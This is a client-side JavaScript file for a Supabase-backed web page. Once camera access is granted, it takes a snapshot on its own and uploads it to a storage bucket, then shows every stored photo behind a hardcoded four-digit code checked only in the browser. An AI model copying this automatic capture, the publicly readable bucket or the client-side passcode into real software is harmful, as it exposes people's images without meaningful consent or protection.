/* ============================
   SUPABASE CONFIG (YOUR VALUES)
   ============================ */
const SUPABASE_URL = "https://edafkomypijighnizyee.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_pR7et-ooMnmBQus4X5vHRg_-1O4_OSi";

const supabase = window.supabase.createClient(
  SUPABASE_URL,
  SUPABASE_ANON_KEY
);

const BUCKET = "photos";

/* ============================
   DOM
   ============================ */
const enableBtn = document.getElementById("enableBtn");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusEl = document.getElementById("status");

const unlockBtn = document.getElementById("unlockBtn");
const codeInput = document.getElementById("codeInput");
const gallery = document.getElementById("gallery");

let stream = null;

/* ============================
   CAMERA FLOW
   ============================ */
enableBtn.onclick = async () => {
  try {
    status("REQUESTING CAMERA");
    console.log("Requesting camera…");

    stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    console.log("Camera granted");
    status("CAMERA READY");

    // wait for video to be ready, then auto-capture
    video.onloadedmetadata = () => {
      setTimeout(captureAndUpload, 300);
    };

  } catch (err) {
    console.error("Camera error", err);
    status("CAMERA ERROR");
  }
};

async function captureAndUpload() {
  try {
    status("CAPTURING");
    console.log("Capturing frame…");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const blob = await new Promise(res =>
      canvas.toBlob(res, "image/png")
    );

    const filename = `snap_${Date.now()}.png`;

    status("UPLOADING");
    console.log("Uploading", filename);

    const { error } = await supabase
      .storage
      .from(BUCKET)
      .upload(filename, blob);

    if (error) throw error;

    status("UPLOADED");
    console.log("Upload success");

  } catch (err) {
    console.error("Upload failed", err);
    status("UPLOAD ERROR");
  }
}

/* ============================
   GALLERY UNLOCK
   ============================ */
unlockBtn.onclick = async () => {
  if (codeInput.value !== "8899") {
    status("DENIED");
    return;
  }

  status("LOADING ARCHIVE");
  gallery.innerHTML = "";

  const { data, error } = await supabase
    .storage
    .from(BUCKET)
    .list("", { limit: 100 });

  if (error) {
    console.error(error);
    status("ARCHIVE ERROR");
    return;
  }

  for (const file of data) {
    const { data: url } = supabase
      .storage
      .from(BUCKET)
      .getPublicUrl(file.name);

    const div = document.createElement("div");
    div.className = "thumb";

    const img = document.createElement("img");
    img.src = url.publicUrl;

    div.appendChild(img);
    gallery.appendChild(div);
  }

  status("ARCHIVE UNLOCKED");
};

/* ============================
   UTIL
   ============================ */
function status(text) {
  statusEl.textContent = "STATUS: " + text;
}
